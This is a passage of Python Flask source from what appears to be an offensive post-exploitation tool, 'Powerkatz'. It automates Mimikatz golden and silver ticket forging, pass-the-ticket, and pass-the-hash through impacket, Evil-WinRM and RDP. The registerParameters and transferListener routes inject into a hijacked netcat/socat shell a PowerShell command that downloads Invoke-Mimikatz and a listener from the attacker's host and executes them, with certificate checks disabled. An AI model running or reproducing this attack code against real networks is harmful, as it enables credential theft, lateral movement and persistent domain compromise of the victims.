                        if 'successfully submitted for current session' not in decryptedResult:
                            messageOutput = 'Unable to inject the forged ticket(s) into memory.'
                            status = 'Failed'

                        tickets = list()
                        matches = findall(r'kerberos::golden.*?/ptt', command)
                        for match in matches:
                            searchMatches = search(r'/user:(.*)\s/domain:.*/sid:.*/target:(.*)\s/service:(.*)\s', match)
                            if searchMatches:
                                username = searchMatches.group(1)
                                target = searchMatches.group(2)
                                service = searchMatches.group(3)
                                tickets.append({
                                    'username': username,
                                    'target': target,
                                    'service': service
                                    })
                        if not tickets:
                            messageOutput = 'Unable to find the forged ticket(s) information.'
                            status = 'Failed'
                        else:
                            passTheTicketResults = await executePassTheTicket(targetIpAddress, tickets, formattedFunctionName)
                            newAgentId = passTheTicketResults['newAgentId']
                            result[targetIpAddress]['newAgentId'] = newAgentId

                            formattedResult = str()
                            formattedResult += f'''Agent ID: {newAgentId}

'''
                            for i, ticket in enumerate(tickets):
                                ticketId = str(i + 1)

                                username = ticket['username']
                                service = ticket['service']
                                target = ticket['target']

                                formattedResult += f'''Ticket #{ticketId}
    Username: {username} (Service: {service})
    FQDN (Fully Qualified Domain Name): {target}

'''
                            formattedResult += 'Note: All outputs are stored in the settings.'
                    else:
                        formattedResult = mimikatzExecutor.silverTicketExport(decryptedResult)
                        if formattedResult == 'Unable to export the ticket(s)':
                            messageOutput = formattedResult
                            status = 'Failed'
                elif formattedFunctionName == 'Kerberos Ticket Authentication (Pass-the-Ticket)':
                    formattedResult, tickets = mimikatzExecutor.passTheTicket(decryptedResult)
                    if formattedResult == 'Unable to inject the ticket(s) into memory' or not tickets:
                            messageOutput = formattedResult
                            status = 'Failed'
                    else:
                        passTheTicketResults = await executePassTheTicket(targetIpAddress, tickets, formattedFunctionName)
                        newAgentId = passTheTicketResults['newAgentId']
                        result[targetIpAddress]['newAgentId'] = newAgentId

                        # format the result again
                        formattedResult = str()
                        formattedResult += f'''Agent ID: {newAgentId}

'''
                        for i, ticket in enumerate(tickets):
                            ticketId = str(i + 1)

                            username = ticket['username']
                            service = ticket['service']
                            target = ticket['target']

                            formattedResult += f'''Ticket #{ticketId}
    Username: {username} (Service: {service})
    FQDN (Fully Qualified Domain Name): {target}

'''
                        formattedResult += 'Note: All outputs are stored in the settings.'

                elif formattedFunctionName == 'Domain Admins Persistence (Golden Ticket Attack)':
                    if '/ptt' in command:
                        if 'successfully submitted for current session' not in decryptedResult:
                            messageOutput = 'Unable to inject the forged ticket(s) into memory.'
                            status = 'Failed'

                        tickets = list()
                        matches = findall(r'kerberos::golden.*?/ptt', command)
                        for match in matches:
                            searchMatches = search(r'/domain:(.*)\s/sid:.*\s/rc4:([a-fA-F0-9]{32})\s/user:(.*)\s/id:', match)
                            if searchMatches:
                                domain = searchMatches.group(1)
                                ntlmHash = searchMatches.group(2)
                                username = searchMatches.group(3)
                                tickets.append({
                                    'username': username,
                                    'domain': domain,
                                    'ntlmHash': ntlmHash
                                    })
                        if not tickets:
                            messageOutput = 'Unable to find the forged ticket(s) information.'
                            status = 'Failed'
                        else:
                            passTheTicketResults = await executePassTheTicket(targetIpAddress, tickets, formattedFunctionName)
                            newAgentId = passTheTicketResults['newAgentId']
                            result[targetIpAddress]['newAgentId'] = newAgentId

                            formattedResult = str()
                            formattedResult += f'''Agent ID: {newAgentId}

'''
                            for i, ticket in enumerate(tickets):
                                ticketId = str(i + 1)

                                username = ticket['username']
                                domain = ticket['domain']
                                ntlmHash = ticket['ntlmHash']

                                formattedResult += f'''Ticket #{ticketId}
    Forged Golden Ticket Username: {username}
    Domain: {domain}
    NTLM Hash: {ntlmHash}

'''
                            formattedResult += 'Note: All outputs are stored in the settings.'
                    else:
                        formattedResult = mimikatzExecutor.goldenTicketExport(decryptedResult)
                        if formattedResult == 'Unable to export the ticket':
                            messageOutput = formattedResult
                            status = 'Failed'

                result[targetIpAddress]['status'] = status
                result[targetIpAddress]['message'] = messageOutput
                result[targetIpAddress]['result'] = formattedResult

                current_app.config['powerkatzHistoryObject'].setIssuedCommands(formattedFunctionName, targetIpAddress, status, command, formattedResult)
            except Exception as error:
                print(f'[ERROR] An error occurred in sendToListener(), error message: {error}')
                status = 'Failed'
                messageOutput = f'Unable to execute the command on the target ({targetIpAddress}). Maybe the Powerkatz Server Listener is down.'
                failedResult = f'N/A (This attack function failed to execute. Reason: {messageOutput}.)'
                result[targetIpAddress]['status'] = status
                result[targetIpAddress]['message'] = messageOutput
                result[targetIpAddress]['result'] = failedResult

                current_app.config['powerkatzHistoryObject'].setIssuedCommands(formattedFunctionName, targetIpAddress, status, command, failedResult)
    elif not isMimikatzCommand:
        if formattedFunctionName == 'Password Hash Authentication (Pass-the-Hash)':
            commands = command.split(';')
            # filters out empty value
            filteredCommands = [filteredCommand for filteredCommand in commands if filteredCommand != '']
            for command in filteredCommands:
                status = 'Succeed'
                splitedCommand = command.split(' ')
                commandProgram = splitedCommand[0]

                isMimikatz = True if commandProgram == 'Invoke-Mimikatz' else False
                isPsExec = True if commandProgram == 'impacket-psexec' else False
                isRDP = True if commandProgram == 'impacket-rdp_check' else False
                isSMB = True if commandProgram == 'impacket-smbexec' else False
                isWinRm = True if commandProgram == 'evil-winrm' else False
                isWMI = True if commandProgram == 'impacket-wmiexec' else False

                mimikatzUsernameMatch = search(r'/user:(.*)\s/domain', command)
                impacketUsernameIpAddressPairMatch = search(r'"([^"]+)"@([^ ]+)', command)
                winRmUsernameIpAddressPairPattern = r'-u\s"([^"]+)".*-i\s(((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4})'
                winRmUsernameIpAddressPairMatch = search(winRmUsernameIpAddressPairPattern, command)

                formattedCommandProgram = str()
                passTheHashUser = str()
                targetIpAddress = str()

                if isMimikatz:
                    formattedCommandProgram = 'Mimikatz (sekurlsa::pth)'
                    passTheHashUser = mimikatzUsernameMatch.group(1)
                elif isPsExec or isRDP or isSMB or isWMI:
                    if isPsExec:
                        formattedCommandProgram = 'Impacket-PsExec'
                    elif isRDP:
                        formattedCommandProgram = 'Impacket-RDP_Check and xfreerdp'
                    elif isSMB:
                        formattedCommandProgram = 'Impacket-SMBExec'
                    elif isWMI:
                        formattedCommandProgram = 'Impacket-WMIExec'

                    passTheHashUser = impacketUsernameIpAddressPairMatch.group(1)
                    targetIpAddress = impacketUsernameIpAddressPairMatch.group(2)
                elif isWinRm:
                    formattedCommandProgram = 'Evil-WinRM'
                    passTheHashUser = winRmUsernameIpAddressPairMatch.group(1)
                    targetIpAddress = winRmUsernameIpAddressPairMatch.group(2)

                # if there's a success command, stop keep trying other methods
                if targetIpAddress in result:
                    if 'succeedMethods' in result[targetIpAddress]:
                        succeedMethods = result[targetIpAddress]['succeedMethods']
                        if succeedMethods:
                            continue

                if isMimikatz:
                    commandToBeExecuted, targetIpAddress = command.split(' # TARGET: ')
                    results = await executeMimikatzPassTheHash(targetIpAddress, commandToBeExecuted, passTheHashUser)
                    isSuccessful = results['isSuccessful']
                    formattedResult = results['messageOutput']
                    newAgentId = results['newAgentId']
                    if targetIpAddress not in result:
                        result[targetIpAddress] = dict()
                        result[targetIpAddress]['succeedMethods'] = list()
                        result[targetIpAddress]['failedMethods'] = list()
                    if not isSuccessful:
                        if newAgentId:
                            powerkatzAgent.removeAgent(newAgentId)

                        status = 'Failed'
                        messageOutput = f'Unable to use the method "{formattedCommandProgram}" to perform Pass-the-Hash on the target ({targetIpAddress}).'
                        failedResult = f'N/A (This attack function failed to execute. Reason: {messageOutput}.)'
                        current_app.config['powerkatzHistoryObject'].setIssuedCommands(formattedFunctionName, targetIpAddress, status, commandToBeExecuted, failedResult)

                        result[targetIpAddress]['message'] = messageOutput
                        result[targetIpAddress]['result'] = failedResult
                        result[targetIpAddress]['failedMethods'].append(formattedCommandProgram)
                        continue
                    else:
                        status = 'Succeed'
                        powerkatzAgent.setupMimikatz(newAgentId, commandProgram)

                        messageOutput = f'Successfully used the method "{formattedCommandProgram}" to perform Pass-the-Hash on the target ({targetIpAddress}).'
                        current_app.config['powerkatzHistoryObject'].setIssuedCommands(formattedFunctionName, targetIpAddress, status, commandToBeExecuted, formattedResult)

                        result[targetIpAddress]['message'] = messageOutput
                        result[targetIpAddress]['result'] = formattedResult
                        result[targetIpAddress]['newAgentId'] = newAgentId
                        result[targetIpAddress]['succeedMethods'].append(formattedCommandProgram)
                        continue
                else:
                    if targetIpAddress not in result:
                        result[targetIpAddress] = dict()
                        result[targetIpAddress]['succeedMethods'] = list()
                        result[targetIpAddress]['failedMethods'] = list()

                    newAgentId = powerkatzAgent.createNewAgent(passTheHashUser, targetIpAddress)
                    newAgent = powerkatzAgent.getAgentById(newAgentId)
                    powerkatzAgent.startOutputReaderThread(newAgent)
                    formattedResult = powerkatzAgent.executeCommandOnAgentProcess(newAgentId, command)

                notPsExecSucceed = True if 'Press help for extra shell commands' not in formattedResult else False
                notRDPSucceed = True if 'Access Granted' not in formattedResult or 'ERRCONNECT_CONNECT_TRANSPORT_FAILED' in formattedResult else False

                notRDPRestrictedAdminModeSucceed = False
                notWMIOrSMBSucceed = True if 'Launching semi-interactive shell' not in formattedResult else False
                notWMISucceed = True if notWMIOrSMBSucceed and isWMI else False
                notSMBSucceed = True if notWMIOrSMBSucceed and isSMB else False
                notWinRmSucceed = True if '*Evil-WinRM*' not in formattedResult else False

                # check "Restricted Admin Mode" is blocking us
                if isRDP and not notRDPSucceed:
                    # wait for the xfreerdp process to start
                    await asyncio.sleep(2)

                    screenshotCommand = f'xwd -name "FreeRDP: {targetIpAddress}" -out /tmp/screenshot.xwd && convert /tmp/screenshot.xwd /tmp/screenshot.png && tesseract /tmp/screenshot.png /tmp/screenshot_output && cat /tmp/screenshot_output.txt'
                    try:
                        screenshotOutput = subprocess.check_output(screenshotCommand, shell=True).decode('utf-8').strip()
                        if 'Account restrictions' in screenshotOutput:
                            notRDPRestrictedAdminModeSucceed = True
                    except subprocess.CalledProcessError as error:
                        print(f'[ERROR] A subprocess CalledProcessError occurred in sendToListener(), error message: {error}')
                        notRDPSucceed = True

                isAnyMethodFailed = True if (isPsExec and notPsExecSucceed) or (isRDP and notRDPSucceed) or notRDPRestrictedAdminModeSucceed or notWMISucceed or notSMBSucceed or (isWinRm and notWinRmSucceed) else False
                if isAnyMethodFailed:
                    powerkatzAgent.removeAgent(newAgentId)
                    status = 'Failed'

                if status == 'Failed':
                    messageOutput = f'Unable to use the method "{formattedCommandProgram}" to perform Pass-the-Hash on the target ({targetIpAddress}).'
                    failedResult = f'N/A (This attack function failed to execute. Reason: {messageOutput}.)'
                    current_app.config['powerkatzHistoryObject'].setIssuedCommands(formattedFunctionName, targetIpAddress, status, command, failedResult)

                    result[targetIpAddress]['message'] = messageOutput
                    result[targetIpAddress]['result'] = failedResult
                    result[targetIpAddress]['failedMethods'].append(formattedCommandProgram)
                elif status == 'Succeed':
                    powerkatzAgent.setupMimikatz(newAgentId, commandProgram)

                    messageOutput = f'Successfully used the method "{formattedCommandProgram}" to perform Pass-the-Hash on the target ({targetIpAddress}).'
                    current_app.config['powerkatzHistoryObject'].setIssuedCommands(formattedFunctionName, targetIpAddress, status, command, formattedResult)

                    result[targetIpAddress]['message'] = messageOutput
                    result[targetIpAddress]['result'] = formattedResult
                    result[targetIpAddress]['newAgentId'] = newAgentId
                    result[targetIpAddress]['succeedMethods'].append(formattedCommandProgram)

            # format final result
            for targetIpAddress in result:
                succeedMethods = result[targetIpAddress]['succeedMethods']
                failedMethods = result[targetIpAddress]['failedMethods']
                if succeedMethods:
                    # format string to '"Method A", "Method B", and "Method C"'
                    if len(succeedMethods) == 1:
                        formattedSucceedMethods = '"' + succeedMethods[0] + '"'
                        messageOutput = f'Successfully used the method {formattedSucceedMethods} to perform Pass-the-Hash on the target {targetIpAddress}.'
                    else:
                        formattedSucceedMethods = ', '.join('"' + item + '"' for item in succeedMethods[:-1]) + ', and "' + succeedMethods[-1] + '"'
                        messageOutput = f'Successfully used the methods {formattedSucceedMethods} to perform Pass-the-Hash on the target  {targetIpAddress}.'
                
                    result[targetIpAddress]['status'] = 'Succeed'
                    result[targetIpAddress]['message'] = messageOutput
                else:
                    # format string to '"Method A", "Method B", and "Method C"'
                    if len(failedMethods) == 1:
                        formattedFailedMethods = '"' + failedMethods[0] + '"'
                        messageOutput = f'Unable to use the method {formattedFailedMethods} to perform Pass-the-Hash on the target {targetIpAddress}.'
                    else:
                        formattedFailedMethods = ', '.join('"' + item + '"' for item in failedMethods[:-1]) + ', and "' + failedMethods[-1] + '"'
                        messageOutput = f'Unable to use the methods {formattedFailedMethods} to perform Pass-the-Hash on the target {targetIpAddress}.'

                    result[targetIpAddress]['status'] = 'Failed'
                    result[targetIpAddress]['message'] = messageOutput

    return jsonify(message=result)

# TODO: implement agent executing Mimikatz commands
@api.route('/agentExecuteMimikatzCommand', methods=('POST',))
def agentExecuteMimikatzCommand():
    jsonBody = request.json
    agentCommand = jsonBody['agentCommand']
    agentIds = jsonBody['agentIds']
    formattedFunctionName = jsonBody['formattedFunctionName']

    result = dict()

    for agentId in agentIds:
        result[agentId] = dict()
        agent = powerkatzAgent.getAgentById(agentId)
        if not agent['isMimikatzSetup']:
            continue

        targetIpAddress = agent['targetIpAddress']

        status = 'Failed'
        messageOutput = 'This feature (Agents executing Mimikatz commands) has not yet been implemented!'
        result[agentId]['status'] = status
        result[agentId]['message'] = messageOutput
        result[agentId]['result'] = messageOutput

        # try:
        #     status = 'Succeed'
        #     messageOutput = f'Attack function "{formattedFunctionName}" has been successfully executed on agent: {agentId}'
            
        #     output = powerkatzAgent.executeMimikatzCommandOnAgentProcess(agentId, agentCommand)

        #     if formattedFunctionName == 'Dump Recently Logged on Accounts\' Password (Mimikatz sekurlsa::logonpasswords)':
        #         formattedResult = mimikatzExecutor.credentialDumping(output, isFromAgent=True)

        #     result[agentId]['status'] = status
        #     result[agentId]['message'] = messageOutput
        #     result[agentId]['result'] = formattedResult

        #     current_app.config['powerkatzHistoryObject'].setIssuedCommands(formattedFunctionName, targetIpAddress, status, agentCommand, formattedResult)
        # except Exception as error:
        #     print(f'[ERROR] An error occurred in agentExecuteMimikatzCommand(), error message: {error}')
        #     status = 'Failed'
        #     messageOutput = f'Unable to execute command on agent {agentIds}. Maybe the agent process is down'
        #     failedResult = f'N/A (This attack function failed to execute. Reason: {messageOutput}.)'
        #     result[agentId]['status'] = status
        #     result[agentId]['message'] = messageOutput
        #     result[agentId]['result'] = failedResult

        #     current_app.config['powerkatzHistoryObject'].setIssuedCommands(formattedFunctionName, targetIpAddress, status, agentCommand, failedResult)

    return jsonify(message=result)

@api.route('/registerParameters', methods=('POST',))
async def registerParameters():
    jsonBody = request.json
    # expected JSON data:
    # {
    #     "10.69.96.79":
    #     {
    #         "currentSession": "shell",
    #         "attackerIpAddress": "10.69.96.69",
    #         "shellType": "Netcat/socat listener (reverse/bind shell)",
    #         "targetPortNumber": "4444"
    #     },
    #     "10.69.96.10":
    #     {
    #         "currentSession": "rdpOrVnc",
    #         "attackerIpAddress": "10.69.96.69"
    #     }
    # }
    global isControllableShell, isOtherShell
    isControllableShell, isOtherShell = False, False
    messageOutput = ''

    if not jsonBody:
        messageOutput = f'Missing target IP address(es).'
        return jsonify(status='Failed', message=messageOutput)

    # validate target IPv4 address
    # from https://stackoverflow.com/questions/5284147/validating-ipv4-addresses-with-regexp
    ipv4IpAddressPattern = r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$'
    targetIpAddresses = jsonBody
    validTargetIpAddreses = set()
    for targetIpAddress in targetIpAddresses:
        matchedTargetIpAddress = match(ipv4IpAddressPattern, targetIpAddress)
        if not matchedTargetIpAddress:
            messageOutput = f'The target IP address {targetIpAddress} is not a valid IPv4 address.'
            return jsonify(status='Failed', message=messageOutput)

        ipAddress = matchedTargetIpAddress.group(0)
        validTargetIpAddreses.add(ipAddress)

    for targetIpAddress in validTargetIpAddreses:
        currentSession = jsonBody[targetIpAddress]['currentSession']
        if not currentSession:
            messageOutput = f'The target IP address {targetIpAddress} was not selected for current sessions.'
            return jsonify(status='Failed', message=messageOutput)

        # validate attacker IPv4 address
        attackerIpAddress = jsonBody[targetIpAddress]['attackerIpAddress']
        if not attackerIpAddress:
            messageOutput = f'Missing attacker IP address.'
            return jsonify(status='Failed', message=messageOutput)

        matchedAttackerIpAddress = match(ipv4IpAddressPattern, attackerIpAddress)
        if not matchedAttackerIpAddress:
            messageOutput = f'The attacker IP address {attackerIpAddress} is not a valid IPv4 address.'
            return jsonify(status='Failed', message=messageOutput)

        if 'shellType' in jsonBody[targetIpAddress]:
            shellType = jsonBody[targetIpAddress]['shellType']
            if not shellType:
                messageOutput = f'The target IP address {targetIpAddress} listener was not selected.'
                return jsonify(status='Failed', message=messageOutput)

            isControllableShell, isOtherShell = checkControllableShell(currentSession, shellType)

        if isControllableShell and currentSession != 'rdpOrVnc':
            targetPortNumber = jsonBody[targetIpAddress]['targetPortNumber']
            if not targetPortNumber:
                messageOutput = f'No listener port numbers were entered.'
                return jsonify(status='Failed', message=messageOutput)

            ssProcess = subprocess.Popen(f'ss -p | grep "ESTAB" | grep "{targetIpAddress}:" | grep "{targetPortNumber}"', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output, error = ssProcess.communicate()

            if not output:
                messageOutput = f'Unable to find the shell\'s socket details. Maybe you typed an incorrect port number ({targetPortNumber})?'
                return jsonify(status='Failed', message=messageOutput)

            socketDetails = output.decode().strip().split()
            socketLocalAddress = socketDetails[4].split(':')[0]
            socketPeerAddress = socketDetails[5].split(':')[0]

            isCorrectAttackerIpAddress = True if socketLocalAddress == attackerIpAddress else False
            isCorrectTargetIpAddress = True if socketPeerAddress == targetIpAddress else False
            if not isCorrectAttackerIpAddress:
                messageOutput = f'The shell\'s attacker IP address ({socketLocalAddress}) doesn\'t match the attacker IP address ({attackerIpAddress}) that you just typed.'
                return jsonify(status='Failed', message=messageOutput)
            if not isCorrectTargetIpAddress:
                messageOutput = f'The shell\'s target IP address ({socketPeerAddress}) doesn\'t match the target IP address ({targetIpAddress}) that you just typed.'
                return jsonify(status='Failed', message=messageOutput)

            processDescription = socketDetails[6].replace('users:', '').strip('()').split(',')
            processName = processDescription[0].replace('"', '')
            processId = processDescription[1].replace('pid=', '')
            processFd = processDescription[2].replace('fd=', '')
            controllableShellBinaryName = ['nc', 'netcat', 'socat']

            if processName not in controllableShellBinaryName:
                messageOutput = f'Unable to find the listener\'s binary name on port {targetPortNumber} (i.e., nc, netcat, socat), thus it is NOT controllable. Please switch to the "Other" shell type option.'
                return jsonify(status='Failed', message=messageOutput)
            
            await forceLaunch64BitPowerShell(processFd, processId)

            await ignoreSSLCheck(processFd, processId)

            # transfer the PowerShell server listener and start it as a background job
            # it also ignores SSL checking in the background job
            command = f"""$serverListenerString = 'IEX (New-Object System.Net.Webclient).DownloadString(''https://{attackerIpAddress}/static/transferFiles/Invoke-Mimikatz.ps1'')' + [Environment]::NewLine + '$apiResponse = Invoke-RestMethod -UseBasicParsing -Uri https://{attackerIpAddress}/api/getKeyIv' + [Environment]::NewLine + (New-Object System.Net.Webclient).DownloadString('https://{attackerIpAddress}/static/transferFiles/Powerkatz_server.ps1');""" + "Start-Job -Name ServerListener -ScriptBlock { Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } }'; [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy; Invoke-Expression $using:serverListenerString }"
            await core.helper.pkinjector.injectStringsToProcess(processFd, processId, command)

            await shellTargetServerPing(processFd, processId, attackerIpAddress)

            targetIpSocket = [f'{targetIpAddress}:{targetPortNumber}']
            remoteSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            isPowerkatzListenerAlive = await powerShellListenerPing(remoteSocket, targetIpSocket, DEFAULT_POWERKATZ_LISTENER_PORT_NUMBER)
            if not isPowerkatzListenerAlive:
                messageOutput = f'Target {targetIpAddress} machine is down or unable to reach our Flask web app.'
                return jsonify(status='Failed', message=messageOutput)

            if not checkIsRegistered():
                messageOutput = f'Target {targetIpAddress} machine is down or unable to reach our Flask web app.'
                return jsonify(status='Failed', message=messageOutput)

            current_app.config['settings']['generalSettings'][targetIpAddress] = dict()
            current_app.config['settings']['generalSettings'][targetIpAddress]['listenerPortNumber'] = targetPortNumber
            current_app.config['settings']['otherGeneralSettings']['attackerIpAddress'] = attackerIpAddress
            current_app.config['settings']['generalSettings'][targetIpAddress]['currentSession'] = currentSession
            current_app.config['settings']['generalSettings'][targetIpAddress]['shellType'] = shellType
            current_app.config['settings']['generalSettings'][targetIpAddress]['shellPid'] = processId
            current_app.config['settings']['generalSettings'][targetIpAddress]['processFd'] = processFd
            current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket'] = remoteSocket
            current_app.config['settings']['generalSettings'][targetIpAddress]['setupComplete'] = True
            current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzListenerPortNumber'] = DEFAULT_POWERKATZ_LISTENER_PORT_NUMBER
        elif currentSession == 'rdpOrVnc' or isOtherShell:
            if not checkIsRegistered():
                messageOutput = f'Target {targetIpAddress} machine is down or unable to reach our Flask web app.'
                return jsonify(status='Failed', message=messageOutput)

            remoteSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            isPowerkatzListenerAlive = await powerShellListenerPing(remoteSocket, [targetIpAddress], DEFAULT_POWERKATZ_LISTENER_PORT_NUMBER)
            if not isPowerkatzListenerAlive:
                messageOutput = f'Target {targetIpAddress}\'s Powerkatz Server Listener is not listening.'
                return jsonify(status='Failed', message=messageOutput)

            current_app.config['settings']['generalSettings'][targetIpAddress] = dict()
            current_app.config['settings']['otherGeneralSettings']['attackerIpAddress'] = attackerIpAddress
            current_app.config['settings']['generalSettings'][targetIpAddress]['currentSession'] = currentSession
            current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket'] = remoteSocket
            current_app.config['settings']['generalSettings'][targetIpAddress]['setupComplete'] = True
            current_app.config['settings']['generalSettings'][targetIpAddress]['shellType'] = 'N/A'
            current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzListenerPortNumber'] = DEFAULT_POWERKATZ_LISTENER_PORT_NUMBER

            if isOtherShell and currentSession == 'shell':
                current_app.config['settings']['generalSettings'][targetIpAddress]['shellType'] = shellType

    listOfTargets = list()
    for targetIpAddress in jsonBody:
        listOfTargets.append(current_app.config['settings']['generalSettings'][targetIpAddress]['setupComplete'])

    if False in listOfTargets:
        messageOutput = f'Target {targetIpAddress} initial setup failed!'
        return jsonify(status='Failed', message=messageOutput)

    for targetIpAddress in jsonBody:
        current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus'] = 'Up and running'

    messageOutput = 'Both Flask web app and the Powerkatz Server Listener are up and running!'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/closeSocket', methods=('GET',))
def close():
    isSocketClosed = closeSocket()
    if not isSocketClosed:
        messageOutput = 'Unable to close the current socket.'
        return jsonify(status='Failed', message=messageOutput)

    messageOutput = 'The current socket is closed.'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/transferListener', methods=('POST',))
async def transferPowerShellListener(*args):
    jsonBody = request.json
    targetIpAddress = jsonBody['targetIpAddress']
    if not targetIpAddress:
        messageOutput = f'Target IP address is not selected.'
        return jsonify(status='Failed', message=messageOutput)

    ipv4IpAddressPattern = r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$'
    matchedTargetIpAddress = match(ipv4IpAddressPattern, targetIpAddress)
    if not matchedTargetIpAddress:
        messageOutput = f'Target IP address {targetIpAddress} is not a valid IPv4 address.'
        return jsonify(status='Failed', message=messageOutput)

    isControllableShell, isOtherShell = checkControllableShell(current_app.config['settings']['generalSettings'][targetIpAddress]['currentSession'], current_app.config['settings']['generalSettings'][targetIpAddress]['shellType'])
    if isControllableShell:
        attackerIpAddress = current_app.config['settings']['otherGeneralSettings']['attackerIpAddress']
        # transfer PowerShell server listener in memory
        command = f"""$serverListenerString = 'IEX (New-Object System.Net.Webclient).DownloadString(''https://{attackerIpAddress}/static/transferFiles/Invoke-Mimikatz.ps1'')' + [Environment]::NewLine + '$apiResponse = Invoke-RestMethod -UseBasicParsing -Uri https://{attackerIpAddress}/api/getKeyIv' + [Environment]::NewLine + (New-Object System.Net.Webclient).DownloadString('https://{attackerIpAddress}/static/transferFiles/Powerkatz_server.ps1')"""
        await core.helper.pkinjector.injectStringsToProcess(current_app.config['settings']['generalSettings'][targetIpAddress]['processFd'], current_app.config['settings']['generalSettings'][targetIpAddress]['shellPid'], command)

        remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
        processFd = current_app.config['settings']['generalSettings'][targetIpAddress]['processFd']
        shellPid = current_app.config['settings']['generalSettings'][targetIpAddress]['shellPid']
        powerkatzListenerPortNumber = current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzListenerPortNumber']
        isListenerStarted = await startPowerShellListenerJob(processFd, shellPid, remoteSocket, targetIpAddress, powerkatzListenerPortNumber)
        if not isListenerStarted:
            messageOutput = f'Target {targetIpAddress} machine is down or unable to reach our Flask web app.'
            return jsonify(status='Failed', message=messageOutput)

        current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus'] = 'Up and running'

        hasMultipleSubnets = False
        for domain in current_app.config['settings']['targetDomain']:
            domainNeworks = current_app.config['settings']['targetDomain'][domain]['networks']
            if len(domainNeworks) > 1:
                hasMultipleSubnets = True

        if hasMultipleSubnets:
            status, messageOutput = await transferAndSetupTunneling()
            if status == 'Failed':
                return jsonify(status=status, message=messageOutput)

        messageOutput = 'The Powerkatz Server Listener is up and running!'
        return jsonify(status='Succeed', message=messageOutput)

    remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
    isPowerkatzListenerAlive = await powerShellListenerPing(remoteSocket, [targetIpAddress], current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzListenerPortNumber'])
    if not isPowerkatzListenerAlive:
        messageOutput = 'The Powerkatz Server Listener is not listening.'
        return jsonify(status='Failed', message=messageOutput)

    current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus'] = 'Up and running'

    hasMultipleSubnets = False
    for domain in current_app.config['settings']['targetDomain']:
        domainNeworks = current_app.config['settings']['targetDomain'][domain]['networks']
        if len(domainNeworks) > 1:
            hasMultipleSubnets = True

    if hasMultipleSubnets:
        status, messageOutput = await transferAndSetupTunneling()
        if status == 'Failed':
            return jsonify(status=status, message=messageOutput)

    messageOutput = 'The Powerkatz Server Listener is up and running!'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/stopListener', methods=('POST',))
async def stopPowerShellListener():
    jsonBody = request.json
    targetIpAddress = jsonBody['targetIpAddress']
    if not targetIpAddress:
        messageOutput = f'Target IP address is not selected.'
        return jsonify(status='Failed', message=messageOutput)

    ipv4IpAddressPattern = r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$'
    matchedTargetIpAddress = match(ipv4IpAddressPattern, targetIpAddress)
    if not matchedTargetIpAddress:
        messageOutput = f'Target IP address {targetIpAddress} is not a valid IPv4 address.'
        return jsonify(status='Failed', message=messageOutput)

    remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
    if not remoteSocket:
        messageOutput = f'Target IP address {targetIpAddress}\'s remote socket is not found. Maybe the Powerkatz Server Listener is not started.'
        return jsonify(status='Failed', message=messageOutput)

    isSocketClosed = closeSocket(remoteSocket)
    if not isSocketClosed:
        messageOutput = 'Unable to close the current socket.'
        return jsonify(status='Failed', message=messageOutput)

    # after the socket has been closed, we have to create a new socket again.
    # this allows us to continue to use it in the future
    remoteSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket'] = remoteSocket
    isControllableShell, isOtherShell = checkControllableShell(current_app.config['settings']['generalSettings'][targetIpAddress]['currentSession'], current_app.config['settings']['generalSettings'][targetIpAddress]['shellType'])
    if isControllableShell:
        await removePowerShellListenerJob(targetIpAddress)

    current_app.config['settings']['otherGeneralSettings']['tunnelingStatus'] = 'Down'
    current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus'] = 'Down'
    messageOutput = 'The Powerkatz Server Listener has been stopped.'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/ping', methods=('GET',))
def checkWebAppIsUpFromRevshell():
    if current_app.config['settings']['otherGeneralSettings']['isRegistered'] == False:
        current_app.config['settings']['otherGeneralSettings']['isRegistered'] = True

    messageOutput = 'The web application is up and running.'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/getKeyIv', methods=('GET',))
def getKey():
    base64Key, base64Iv = current_app.config['AESEncryptorObject'].getBase64KeyIv()
    if not base64Key or not base64Iv:
        messageOutput = 'Unable to get the base64 encoded AES CBC mode key and IV value.'
        return jsonify(status='Failed', message=messageOutput)

    return jsonify(status='Succeed', key=base64Key, iv=base64Iv)

@api.route('/enumerateComputerDomain', methods=('POST',))
def enumerateAgain():
    jsonBody = request.json
    targetIpAddresses = jsonBody['targetIpAddresses']

    # validate target IP address(es)
    if not targetIpAddresses:
        messageOutput = 'Missing target IP address(es).'
        return jsonify(status='Failed', message=messageOutput)

    ipv4IpAddressPattern = r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$'
    for targetIpAddress in targetIpAddresses:
        matchedTargetIpAddress = match(ipv4IpAddressPattern, targetIpAddress)
